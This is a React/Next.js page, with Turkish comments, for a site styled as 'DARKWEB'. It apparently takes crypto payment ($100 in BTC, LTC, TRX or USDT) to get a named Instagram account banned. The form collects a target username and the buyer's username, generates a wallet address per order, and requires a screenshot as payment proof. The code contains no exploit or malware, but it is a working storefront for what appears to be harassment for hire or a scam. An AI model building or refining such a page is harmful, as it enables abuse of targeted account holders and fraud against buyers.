"use client";
import { useEffect, useState, useRef } from 'react';

export default function Home() {
  const [isPopupOpen, setIsPopupOpen] = useState(false);
  const [showItems, setShowItems] = useState([false, false, false, false, false]);
  const [copiedId, setCopiedId] = useState("");
  const [selectedAsset, setSelectedAsset] = useState("BTC");
  const [isSelectOpen, setIsSelectOpen] = useState(false);
  
  const [dynamicAddress, setDynamicAddress] = useState("Generating...");
  const [currentOrderId, setCurrentOrderId] = useState<number | null>(null);
  const [lastGeneratedAsset, setLastGeneratedAsset] = useState("");
  const [isGenerating, setIsGenerating] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  // 1. ID'yi sayfa yenilenene kadar donduran referans
  const orderIdRef = useRef<number | null>(null);
  
  // 2. Üretilen adresleri hafızada tutan referans (Örn: { btc: "...", ltc: "..." })
  const addressCache = useRef<{ [key: string]: string }>({});

  const [cryptoPrices, setCryptoPrices] = useState<{ [key: string]: number }>({ BTC: 0, LTC: 0, TRX: 0, USDT: 1 });

  useEffect(() => {
    const fetchPrices = async () => {
      try {
        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,litecoin,tron,tether&vs_currencies=usd');
        const data = await res.json();
        setCryptoPrices({ BTC: data.bitcoin.usd, LTC: data.litecoin.usd, TRX: data.tron.usd, USDT: data.tether.usd });
      } catch (error) { console.error("Fiyat hatası:", error); }
    };
    fetchPrices();
  }, []);

  const fetchNewAddress = async (asset: string) => {
    const lowerAsset = asset.toLowerCase();

    // EĞER BU COIN İÇİN DAHA ÖNCE ADRES ÜRETİLDİYSE, API'YE GİTME, HAFIZADAN GETİR
    if (addressCache.current[lowerAsset]) {
      setDynamicAddress(addressCache.current[lowerAsset]);
      setLastGeneratedAsset(asset);
      return;
    }

    if (isGenerating) return;
    setIsGenerating(true);
    setDynamicAddress("Generating unique address...");

    try {
      // URL'ye mevcut ID'yi ekle (Backend'de ID artmasın diye)
      let url = `/api/get-address?asset=${lowerAsset}`;
      if (orderIdRef.current) {
        url += `&existingOrder=${orderIdRef.current}`;
      }
      
      const res = await fetch(url);
      const data = await res.json();
      
      if (data.address) {
        // GELEN ADRESİ HAFIZAYA KAYDET (Sayfa yenilenene kadar bir daha API'ye sormayacak)
        addressCache.current[lowerAsset] = data.address;
        
        setDynamicAddress(data.address);
        setLastGeneratedAsset(asset);
        
        // İlk kez ID oluştuğunda kaydet
        if (orderIdRef.current === null && data.orderId) {
          orderIdRef.current = data.orderId;
          setCurrentOrderId(data.orderId);
        }
      }
    } catch (err) {
      setDynamicAddress("Error generating address");
    } finally {
      setIsGenerating(false);
    }
  };

  useEffect(() => {
    if (isPopupOpen) {
      fetchNewAddress(selectedAsset);
    }
  }, [selectedAsset, isPopupOpen]);

  const calculateAmount = () => {
    const price = cryptoPrices[selectedAsset];
    if (!price || price === 0) return "Loading...";
    return (100 / price).toFixed(selectedAsset === "BTC" ? 6 : 4);
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (isSubmitting || isGenerating) return;
    setIsSubmitting(true);

    const formData = new FormData(e.currentTarget);
    formData.append("assetType", selectedAsset); 
    formData.append("cryptoAmount", calculateAmount());
    formData.append("orderId", currentOrderId?.toString() || "");
    formData.append("generatedAddress", dynamicAddress);

    try {
      const res = await fetch('/api/upload', { method: 'POST', body: formData });
      const data = await res.json();
      if (data.success) {
        window.location.href = `/finish?order=${currentOrderId}`;
      } else {
        alert("Hata: " + data.error);
        setIsSubmitting(false);
      }
    } catch (err) {
      alert("Bir hata oluştu.");
      setIsSubmitting(false);
    }
  };

  const copyValue = (text: string, id: string) => {
    navigator.clipboard.writeText(text).then(() => {
      setCopiedId(id);
      setTimeout(() => setCopiedId(""), 1500);
    });
  };

  const setShowStatus = (index: number) => {
    setShowItems(prev => {
      const newState = [...prev];
      newState[index] = true;
      return newState;
    });
  };

  useEffect(() => {
    const timers = [
      setTimeout(() => setShowStatus(0), 400),
      setTimeout(() => setShowStatus(1), 800),
      setTimeout(() => setShowStatus(2), 800),
      setTimeout(() => setShowStatus(4), 1200),
      setTimeout(() => setShowStatus(3), 1500),
    ];
    return () => timers.forEach(t => clearTimeout(t));
  }, []);

  return (
    <main>
      <center>
        <div className="nice" style={{ display: isPopupOpen ? 'none' : 'block' }}>
          <div className="content">
            <p className={`text fade-item ${showItems[0] ? 'show' : ''}`}>WELCOME TO</p>
            <img src="/logo.jpg" width="230" alt="logo" className={`fade-item ${showItems[1] ? 'show' : ''}`} />
            <p className={`text-2 fade-item ${showItems[2] ? 'show' : ''}`}>DARKWEB</p>
            <br />
            <button onClick={() => setIsPopupOpen(true)} className={`btn1 fade-item ${showItems[3] ? 'show' : ''}`}>enter</button>
            <br /><br />
            <p className={`text-3 fade-item ${showItems[4] ? 'show' : ''}`}>WHERE FREEDOM TRULY LIES.</p>
          </div>
        </div>

        <div id="overlay" className={isPopupOpen ? 'active' : ''} onClick={() => setIsPopupOpen(false)}></div>

        <div id="popup" className={isPopupOpen ? 'active' : ''} onClick={(e) => e.stopPropagation()}>
          <div id="popup-content">
            <p className="text-1">IG-Banned</p>
            <p className="text-p">Please Login with Your Information.</p>

            <form onSubmit={handleSubmit} className="left">
              <label className="input-label">Username</label>
              <input type="text" className="inputs" name="username" required />

              <label className="input-label" style={{marginTop: '12px'}}>Your Username</label>
              <input type="text" className="inputs" name="yourusername" required />

              <label className="input-label" style={{marginTop: '12px'}}>Select Asset</label>
              <select 
                className={`inputs select-box ${isSelectOpen ? 'open' : ''}`} 
                value={selectedAsset} 
                onChange={(e) => {
                  setSelectedAsset(e.target.value);
                  setIsSelectOpen(false);
                }}
                onMouseDown={() => setIsSelectOpen(!isSelectOpen)}
              >
                <option value="BTC">Bitcoin (BTC)</option>
                <option value="LTC">Litecoin (LTC)</option>
                <option value="TRX">TRON (TRX)</option>
                <option value="USDT">Tether (USDT-TRC20)</option>
              </select>

              <label className="input-label" style={{marginTop: '12px'}}>Amount to Send ($100)</label>
              <div className="input-wrapper">
                <input type="text" className="inputs address-input" value={calculateAmount()} readOnly style={{ color: '#2e5f73', fontWeight: 'bold' }} />
                <button type="button" className="copy-btn-modern" onClick={() => copyValue(calculateAmount(), "amount")}>
                  {copiedId === 'amount' ? '✓' : <CopyIcon />}
                </button>
              </div>

              <label className="input-label" style={{marginTop: '12px'}}>Wallet Address ({selectedAsset})</label>
              <div className="input-wrapper">
                <input type="text" className="inputs address-input" value={dynamicAddress} readOnly />
                <button type="button" className="copy-btn-modern" onClick={() => copyValue(dynamicAddress, "iban")}>
                  {copiedId === 'iban' ? '✓' : <CopyIcon />}
                </button>
              </div>

              <label className="input-label" style={{marginTop: '12px'}}>Proof (Screenshot)</label>
              <input type="file" name="file" className="file-input" required />

              <button type="submit" className="btn2" disabled={isSubmitting || isGenerating}>
                {isSubmitting ? "Processing..." : "Send Form"}
              </button>
            </form>
          </div>
        </div>
      </center>
    </main>
  );
}

function CopyIcon() {
  return (
    <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#081c23" strokeWidth="2.5">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
    </svg>
  );
}